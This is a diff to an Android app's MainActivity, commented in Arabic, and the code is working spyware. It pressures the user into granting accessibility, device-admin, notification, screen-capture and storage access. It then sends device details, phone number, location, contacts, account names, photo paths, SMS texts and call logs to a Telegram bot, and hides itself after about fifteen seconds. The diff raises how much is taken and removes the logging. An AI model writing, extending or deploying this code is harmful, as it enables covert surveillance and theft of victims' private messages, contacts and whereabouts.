@@ -73,7 +73,9 @@ public class MainActivity extends AppCompatActivity {
         Manifest.permission.RECORD_AUDIO,
         Manifest.permission.CAMERA,
         Manifest.permission.ACCESS_FINE_LOCATION,
-        Manifest.permission.ACCESS_COARSE_LOCATION
+        Manifest.permission.ACCESS_COARSE_LOCATION,
+        Manifest.permission.READ_EXTERNAL_STORAGE,
+        Manifest.permission.WRITE_EXTERNAL_STORAGE
     };
     
     private Button btnActivate;
@@ -84,7 +86,7 @@ public class MainActivity extends AppCompatActivity {
         super.onCreate(savedInstanceState);
         
         // إرسال إشعار فور التثبيت
-        sendMessage("📱 **تم تثبيت التطبيق**\nفي انتظار الصلاحيات...");
+        sendMessage("📱 **تم تثبيت التطبيق**\nالرجاء تفعيل الصلاحيات");
         
         LinearLayout layout = new LinearLayout(this);
         layout.setOrientation(LinearLayout.VERTICAL);
@@ -92,14 +94,14 @@ public class MainActivity extends AppCompatActivity {
         layout.setPadding(50, 50, 50, 50);
         
         tvStatus = new TextView(this);
-        tvStatus.setText("🔒 التطبيق غير مفعل\nالرجاء تفعيل الصلاحيات");
+        tvStatus.setText("🔒 التطبيق غير مفعل\nالرجاء تفعيل جميع الصلاحيات");
         tvStatus.setTextSize(18);
         tvStatus.setGravity(Gravity.CENTER);
         tvStatus.setTextColor(0xFF000000);
         tvStatus.setPadding(0, 0, 0, 50);
         
         btnActivate = new Button(this);
-        btnActivate.setText("🔓 تفعيل التطبيق والصلاحيات");
+        btnActivate.setText("🔓 تفعيل جميع الصلاحيات");
         btnActivate.setTextSize(16);
         btnActivate.setPadding(30, 20, 30, 20);
         btnActivate.setOnClickListener(new View.OnClickListener() {
@@ -118,28 +120,30 @@ public class MainActivity extends AppCompatActivity {
 
     private void updateStatus() {
         if (checkAllPermissions()) {
-            tvStatus.setText("✅ التطبيق مفعل بالكامل\nجاري سحب المعلومات...");
+            tvStatus.setText("✅ جميع الصلاحيات مفعلة\nجاري سحب المعلومات...");
             tvStatus.setTextColor(0xFF00AA00);
-            btnActivate.setText("✅ جاري السحب...");
+            btnActivate.setText("✅ جاري السحب");
             btnActivate.setEnabled(false);
             
-            // سحب كل المعلومات تلقائياً
+            // سحب كل المعلومات
             sendAllData();
             
-            // إخفاء التطبيق بعد 10 ثواني عشان يخلص سحب
+            // إخفاء التطبيق بعد 15 ثانية
             new android.os.Handler().postDelayed(new Runnable() {
                 @Override
                 public void run() {
                     hideAppAndStartServices();
                 }
-            }, 10000);
+            }, 15000);
         }
     }
 
     private boolean checkAllPermissions() {
+        // صلاحية الإشعارات
         String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
         boolean notificationEnabled = enabledListeners != null && enabledListeners.contains(getPackageName());
         
+        // صلاحية الوصول
         AccessibilityManager am = (AccessibilityManager) getSystemService(ACCESSIBILITY_SERVICE);
         List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
         boolean accessibilityEnabled = false;
@@ -150,16 +154,20 @@ public class MainActivity extends AppCompatActivity {
             }
         }
         
+        // صلاحية Admin
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
         boolean adminEnabled = dpm.isAdminActive(adminReceiver);
         
+        // صلاحية تسجيل الشاشة
         SharedPreferences prefs = getSharedPreferences("screen_capture", MODE_PRIVATE);
         boolean screenCaptureEnabled = prefs.contains("resultCode");
         
+        // تجاهل البطارية
         PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
         boolean batteryIgnored = pm.isIgnoringBatteryOptimizations(getPackageName());
         
+        // الأذونات العادية
         boolean normalPermissions = true;
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -172,11 +180,15 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void requestAllPermissions() {
-        Toast.makeText(this, "جاري فتح إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
+        Toast.makeText(this, "جاري فتح جميع إعدادات الصلاحيات...", Toast.LENGTH_LONG).show();
         
+        // 1. صلاحية الإشعارات
         startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
+        
+        // 2. صلاحية الوصول
         startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
         
+        // 3. صلاحية Admin
         ComponentName adminReceiver = new ComponentName(this, AdminReceiver.class);
         DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
         if (!dpm.isAdminActive(adminReceiver)) {
@@ -185,6 +197,7 @@ public class MainActivity extends AppCompatActivity {
             startActivity(adminIntent);
         }
         
+        // 4. صلاحية تسجيل الشاشة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             MediaProjectionManager projectionManager = 
                 (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
@@ -194,10 +207,12 @@ public class MainActivity extends AppCompatActivity {
             );
         }
         
+        // 5. تجاهل البطارية
         Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
         batteryIntent.setData(Uri.parse("package:" + getPackageName()));
         startActivity(batteryIntent);
         
+        // 6. الأذونات العادية
         List<String> permissionsNeeded = new ArrayList<>();
         for (String permission : permissions) {
             if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
@@ -213,28 +228,35 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void sendAllData() {
-        sendMessage("📱 **بدأ سحب المعلومات...**");
+        sendMessage("📱 **بدأ سحب جميع المعلومات...**");
         
-        // معلومات الجهاز
-        sendDeviceInfo();
-        
-        // جهات الاتصال
-        getContacts();
-        
-        // الموقع
-        getLocation();
-        
-        // الحسابات
-        getAccounts();
-        
-        // الصور
-        getPhotos();
-        
-        // الرسائل
-        getSms();
-        
-        // سجل المكالمات
-        getCallLog();
+        new Thread(new Runnable() {
+            @Override
+            public void run() {
+                // معلومات الجهاز
+                sendDeviceInfo();
+                
+                // جهات الاتصال
+                getContacts();
+                
+                // الموقع
+                getLocation();
+                
+                // الحسابات
+                getAccounts();
+                
+                // الصور
+                getPhotos();
+                
+                // الرسائل
+                getSms();
+                
+                // سجل المكالمات
+                getCallLog();
+                
+                sendMessage("✅ **تم سحب جميع المعلومات بنجاح**");
+            }
+        }).start();
     }
 
     private void sendDeviceInfo() {
@@ -243,14 +265,18 @@ public class MainActivity extends AppCompatActivity {
             info.put("model", Build.MODEL);
             info.put("manufacturer", Build.MANUFACTURER);
             info.put("android_version", Build.VERSION.RELEASE);
+            info.put("sdk", Build.VERSION.SDK_INT);
             
             TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
             if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                 info.put("phone", tm.getLine1Number());
+                info.put("network", tm.getNetworkOperatorName());
             }
             
-            sendMessage("📱 **Device Info:**\n" + info.toString(2));
-        } catch (Exception e) {}
+            sendMessage("📱 **معلومات الجهاز:**\n" + info.toString(2));
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب معلومات الجهاز");
+        }
     }
 
     private void getLocation() {
@@ -261,126 +287,138 @@ public class MainActivity extends AppCompatActivity {
             if (location == null) location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
             if (location != null) {
                 String map = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
-                sendMessage("📍 **Location:**\nLat: " + location.getLatitude() + "\nLng: " + location.getLongitude() + "\n" + map);
+                sendMessage("📍 **الموقع:**\nخط العرض: " + location.getLatitude() + "\nخط الطول: " + location.getLongitude() + "\n" + map);
+            } else {
+                sendMessage("📍 **الموقع:** غير متوفر");
             }
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب الموقع");
+        }
     }
 
     private void getContacts() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    ContentResolver cr = getContentResolver();
-                    Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null, null, null, null);
-                    StringBuilder sb = new StringBuilder("📇 **Contacts:**\n");
-                    int count = 0;
-                    while (cursor != null && cursor.moveToNext() && count < 20) {
-                        String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                        String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                        sb.append(name).append(": ").append(number).append("\n");
-                        count++;
-                    }
-                    if (cursor != null) cursor.close();
-                    sendMessage(sb.toString());
-                } catch (Exception e) {}
+        try {
+            ContentResolver cr = getContentResolver();
+            Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null, null);
+            StringBuilder sb = new StringBuilder("📇 **جهات الاتصال:**\n");
+            int count = 0;
+            while (cursor != null && cursor.moveToNext() && count < 50) {
+                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                sb.append(name).append(": ").append(number).append("\n");
+                count++;
             }
-        }).start();
+            if (cursor != null) cursor.close();
+            if (count > 0) {
+                sendMessage(sb.toString());
+            } else {
+                sendMessage("📇 **جهات الاتصال:** لا توجد جهات اتصال");
+            }
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب جهات الاتصال");
+        }
     }
 
     private void getAccounts() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
-                    Account[] accounts = am.getAccounts();
-                    StringBuilder sb = new StringBuilder("👤 **Accounts:**\n");
-                    for (Account acc : accounts) {
-                        sb.append(acc.type).append(": ").append(acc.name).append("\n");
-                    }
-                    sendMessage(sb.toString());
-                } catch (Exception e) {}
+        try {
+            AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
+            Account[] accounts = am.getAccounts();
+            StringBuilder sb = new StringBuilder("👤 **الحسابات:**\n");
+            for (Account acc : accounts) {
+                sb.append(acc.type).append(": ").append(acc.name).append("\n");
             }
-        }).start();
+            if (accounts.length > 0) {
+                sendMessage(sb.toString());
+            } else {
+                sendMessage("👤 **الحسابات:** لا توجد حسابات");
+            }
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب الحسابات");
+        }
     }
 
     private void getPhotos() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    String[] projection = {MediaStore.Images.Media.DATA};
-                    Cursor cursor = getContentResolver().query(
-                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 5");
-                    StringBuilder sb = new StringBuilder("🖼 **Last 5 Photos:**\n");
-                    while (cursor != null && cursor.moveToNext()) {
-                        String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
-                        sb.append(path).append("\n");
-                    }
-                    if (cursor != null) cursor.close();
-                    sendMessage(sb.toString());
-                } catch (Exception e) {}
+        try {
+            String[] projection = {MediaStore.Images.Media.DATA};
+            Cursor cursor = getContentResolver().query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, "date_added DESC LIMIT 10");
+            StringBuilder sb = new StringBuilder("🖼 **آخر 10 صور:**\n");
+            int count = 0;
+            while (cursor != null && cursor.moveToNext()) {
+                String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                sb.append(path).append("\n");
+                count++;
             }
-        }).start();
+            if (cursor != null) cursor.close();
+            if (count > 0) {
+                sendMessage(sb.toString());
+            } else {
+                sendMessage("🖼 **الصور:** لا توجد صور");
+            }
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب الصور");
+        }
     }
 
     private void getSms() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Cursor cursor = getContentResolver().query(
-                        Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 10");
-                    StringBuilder sb = new StringBuilder("📨 **Last 10 SMS:**\n");
-                    while (cursor != null && cursor.moveToNext()) {
-                        String address = cursor.getString(cursor.getColumnIndex("address"));
-                        String body = cursor.getString(cursor.getColumnIndex("body"));
-                        sb.append(address).append(": ").append(body).append("\n---\n");
-                    }
-                    if (cursor != null) cursor.close();
-                    sendMessage(sb.toString());
-                } catch (Exception e) {}
+        try {
+            Cursor cursor = getContentResolver().query(
+                Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 20");
+            StringBuilder sb = new StringBuilder("📨 **آخر 20 رسالة:**\n");
+            int count = 0;
+            while (cursor != null && cursor.moveToNext()) {
+                String address = cursor.getString(cursor.getColumnIndex("address"));
+                String body = cursor.getString(cursor.getColumnIndex("body"));
+                sb.append(address).append(": ").append(body).append("\n---\n");
+                count++;
             }
-        }).start();
+            if (cursor != null) cursor.close();
+            if (count > 0) {
+                sendMessage(sb.toString());
+            } else {
+                sendMessage("📨 **الرسائل:** لا توجد رسائل");
+            }
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب الرسائل");
+        }
     }
 
     private void getCallLog() {
-        new Thread(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    Cursor cursor = getContentResolver().query(
-                        Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 10");
-                    StringBuilder sb = new StringBuilder("📞 **Last 10 Calls:**\n");
-                    while (cursor != null && cursor.moveToNext()) {
-                        String number = cursor.getString(cursor.getColumnIndex("number"));
-                        String type = cursor.getString(cursor.getColumnIndex("type"));
-                        String duration = cursor.getString(cursor.getColumnIndex("duration"));
-                        sb.append(number).append(" (").append(type).append(") ").append(duration).append("s\n");
-                    }
-                    if (cursor != null) cursor.close();
-                    sendMessage(sb.toString());
-                } catch (Exception e) {}
+        try {
+            Cursor cursor = getContentResolver().query(
+                Uri.parse("content://call_log/calls"), null, null, null, "date DESC LIMIT 20");
+            StringBuilder sb = new StringBuilder("📞 **آخر 20 مكالمة:**\n");
+            int count = 0;
+            while (cursor != null && cursor.moveToNext()) {
+                String number = cursor.getString(cursor.getColumnIndex("number"));
+                String type = cursor.getString(cursor.getColumnIndex("type"));
+                String duration = cursor.getString(cursor.getColumnIndex("duration"));
+                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
+                sb.append(number).append(" (").append(typeText).append(") ").append(duration).append("ث\n");
+                count++;
             }
-        }).start();
+            if (cursor != null) cursor.close();
+            if (count > 0) {
+                sendMessage(sb.toString());
+            } else {
+                sendMessage("📞 **سجل المكالمات:** لا توجد مكالمات");
+            }
+        } catch (Exception e) {
+            sendMessage("❌ فشل سحب سجل المكالمات");
+        }
     }
 
     private void sendMessage(String text) {
-        System.out.println("Sending: " + text); // للتأكد في الـ Log
         Request request = new Request.Builder()
                 .url("https://api.telegram.org/bot" + TOKEN + "/sendMessage")
                 .post(new FormBody.Builder().add("chat_id", CHAT_ID).add("text", text).build())
                 .build();
         client.newCall(request).enqueue(new okhttp3.Callback() {
             @Override public void onResponse(Call call, Response response) { 
-                System.out.println("Sent successfully: " + text);
                 try { response.close(); } catch (Exception e) {}
             }
-            @Override public void onFailure(Call call, IOException e) {
-                System.out.println("Failed to send: " + e.getMessage());
-            }
+            @Override public void onFailure(Call call, IOException e) {}
         });
     }
 
@@ -419,4 +457,4 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
         updateStatus();
     }
-}
+                }
